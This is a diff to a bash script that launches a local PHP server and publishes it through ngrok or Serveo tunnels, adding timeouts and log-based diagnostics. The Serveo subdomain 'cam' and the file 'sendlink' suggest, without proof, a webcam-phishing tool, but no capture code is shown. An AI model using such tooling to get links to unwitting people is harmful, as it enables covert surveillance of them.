@@ -287,28 +287,39 @@ try_ngrok() {
 		return 1
 	fi
 
-	printf "\e[1;92m[+] ngrok: starting...\e[0m\n"
+	printf "\e[1;92m[+] ngrok: starting (waiting up to 5 seconds): \e[0m"
 	
-	# Start ngrok
-	$NGROK_CMD http 3333 > ngrok.log 2>&1 &
+	# Kill any existing ngrok
+	pkill -f "ngrok http" 2>/dev/null || true
+	sleep 1
+	
+	# Start ngrok with explicit logging
+	$NGROK_CMD http 3333 --log=stdout > ngrok.log 2>&1 &
 	local ngrok_pid=$!
 	
-	# Quick 5-second timeout
+	# Monitor for 5 seconds
 	local elapsed=0
+	local link=""
+	
 	while [[ $elapsed -lt 5 ]]; do
 		sleep 1
 		elapsed=$((elapsed+1))
 		
 		# Check if process alive
 		if ! kill -0 $ngrok_pid 2>/dev/null; then
-			printf "\e[1;31m[!] ngrok failed\e[0m\n"
-			kill $ngrok_pid 2>/dev/null || true
+			printf "\n\e[1;31m[!] ngrok process crashed\e[0m\n"
+			# Show ngrok error
+			if [[ -s ngrok.log ]]; then
+				printf "\e[1;93m[DEBUG] Last 5 lines of ngrok.log:\e[0m\n"
+				tail -5 ngrok.log | sed 's/^/    /'
+			fi
 			return 1
 		fi
 		
 		# Check for link
-		local link=$(grep -o 'https://[A-Za-z0-9.-]*\.ngrok\.io' ngrok.log 2>/dev/null | head -1)
+		link=$(grep -oP 'https://[A-Za-z0-9\-\.]+\.ngrok\.io' ngrok.log 2>/dev/null | head -1)
 		if [[ -n "$link" ]]; then
+			printf "\e[1;92m ✓\e[0m\n"
 			printf "\e[1;92m[✓] ngrok ready: $link\e[0m\n"
 			echo "$link"
 			return 0
@@ -317,9 +328,27 @@ try_ngrok() {
 		printf "."
 	done
 	
-	# Timeout
-	printf "\n\e[1;93m[!] ngrok timeout (5sec)\e[0m\n"
+	# Timeout occurred
+	printf "\n\e[1;31m[!] ngrok timeout (5 seconds elapsed)\e[0m\n"
+	
+	# Diagnose the issue
+	if [[ -s ngrok.log ]]; then
+		if grep -q "invalid auth token\|ERR_NGROK_401" ngrok.log; then
+			printf "\e[1;31m[!] ERROR: Invalid or blocked ngrok token\e[0m\n"
+			printf "\e[1;93m    Visit: https://dashboard.ngrok.com\e[0m\n"
+		elif grep -q "Tunnel limit exceeded\|ERR_NGROK_403" ngrok.log; then
+			printf "\e[1;31m[!] ERROR: Tunnel limit exceeded on ngrok account\e[0m\n"
+		elif grep -q "ERR_NGROK" ngrok.log; then
+			printf "\e[1;31m[!] ngrok error:\e[0m\n"
+			grep "ERR_NGROK" ngrok.log | head -2 | sed 's/^/    /'
+		else
+			printf "\e[1;93m[!] ngrok output:\e[0m\n"
+			tail -3 ngrok.log | sed 's/^/    /'
+		fi
+	fi
+	
 	kill $ngrok_pid 2>/dev/null || true
+	wait $ngrok_pid 2>/dev/null || true
 	return 1
 }
 
@@ -327,18 +356,18 @@ try_ngrok() {
 # Start Serveo tunnel (fallback)
 # ============================================================================
 try_serveo() {
-	printf "\e[1;92m[+] serveo: starting SSH tunnel...\e[0m\n"
-	
 	if ! has_cmd ssh; then
-		printf "\e[1;31m[!] ssh not available\e[0m\n"
+		printf "\e[1;31m[✗] ssh not available - Serveo requires SSH\e[0m\n"
 		return 1
 	fi
 
-	# Generate random subdomain
+	printf "\e[1;92m[+] serveo: starting SSH tunnel (max 10 seconds): \e[0m"
+
 	local subdomain="cam$RANDOM"
 	
 	# Start SSH tunnel
-	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R ${subdomain}:80:localhost:3333 serveo.net > sendlink 2>&1 &
+	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ConnectTimeout=5 \
+		-R ${subdomain}:80:127.0.0.1:3333 serveo.net > sendlink 2>&1 &
 	local ssh_pid=$!
 	
 	# Quick polling (3 seconds)
@@ -346,36 +375,55 @@ try_serveo() {
 	while [[ $elapsed -lt 3 ]]; do
 		sleep 1
 		elapsed=$((elapsed+1))
+		printf "."
 		
 		# Check for link
 		if [[ -f sendlink ]]; then
 			local link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
 			if [[ -n "$link" ]]; then
+				printf "\e[1;92m ✓\e[0m\n"
 				printf "\e[1;92m[✓] serveo ready: $link\e[0m\n"
 				echo "$link"
 				return 0
 			fi
 		fi
-		
-		printf "."
 	done
 	
-	# Still waiting - give it more time but show progress
-	printf "\n\e[1;92m[+] serveo: waiting for link...\e[0m\n"
-	sleep 7
+	# Extended wait (additional 7 seconds)
+	while [[ $elapsed -lt 10 ]]; do
+		sleep 1
+		elapsed=$((elapsed+1))
+		printf "."
+		
+		if [[ -f sendlink ]]; then
+			local link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
+			if [[ -n "$link" ]]; then
+				printf "\e[1;92m ✓\e[0m\n"
+				printf "\e[1;92m[✓] serveo ready: $link\e[0m\n"
+				echo "$link"
+				return 0
+			fi
+		fi
+	done
 	
-	# Final check
-	if [[ -f sendlink ]]; then
-		local link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
-		if [[ -n "$link" ]]; then
-			printf "\e[1;92m[✓] serveo ready: $link\e[0m\n"
-			echo "$link"
-			return 0
+	# Timeout
+	printf "\e[1;31m ✗\e[0m\n"
+	printf "\e[1;31m[!] Serveo timeout (10 seconds elapsed)\e[0m\n"
+	
+	# Diagnose
+	if [[ -f sendlink ]] && [[ -s sendlink ]]; then
+		if grep -q "Connection refused\|Network is unreachable" sendlink; then
+			printf "\e[1;31m[!] Network error: Cannot reach serveo.net\e[0m\n"
+		elif grep -q "Timeout\|timed out" sendlink; then
+			printf "\e[1;31m[!] Connection timeout to serveo.net\e[0m\n"
+		else
+			printf "\e[1;93m[DEBUG] SSH output (last 3 lines):\e[0m\n"
+			tail -3 sendlink | sed 's/^/    /'
 		fi
 	fi
 	
-	printf "\e[1;93m[!] serveo timeout\e[0m\n"
 	kill $ssh_pid 2>/dev/null || true
+	wait $ssh_pid 2>/dev/null || true
 	return 1
 }
 
@@ -487,7 +535,28 @@ main() {
 	fi
 	
 	printf "\e[1;92m[✓] PHP server running\e[0m\n"
-
+	# Quick network check before trying tunnels
+	printf "\n\e[1;92m[*] Network diagnostics...\e[0m\n"
+	
+	# Check if PHP is actually listening
+	printf "\e[1;92m[+] Checking PHP on 0.0.0.0:3333...\e[0m\n"
+	if curl -s --max-time 1 http://127.0.0.1:3333/index.php >/dev/null 2>&1; then
+		printf "\e[1;92m[✓] PHP is responding\e[0m\n"
+	else
+		printf "\e[1;31m[!] ERROR: PHP not responding on 127.0.0.1:3333\e[0m\n"
+		printf "\e[1;93m[DEBUG] PHP log:\e[0m\n"
+		head -20 php.log || true
+		stop
+	fi
+	
+	# Check internet connectivity
+	printf "\e[1;92m[+] Checking internet...\e[0m\n"
+	if curl -s --max-time 3 https://google.com >/dev/null 2>&1; then
+		printf "\e[1;92m[✓] Internet OK\e[0m\n"
+	else
+		printf "\e[1;93m[!] WARNING: No internet or slow connection\e[0m\n"
+		printf "\e[1;93m    Ngrok/Serveo may fail\e[0m\n"
+	fi
 	# Try ngrok first (unless in WSL), then Serveo
 	printf "\n\e[1;92m[*] Obtaining public link...\e[0m\n"
 	local link=""
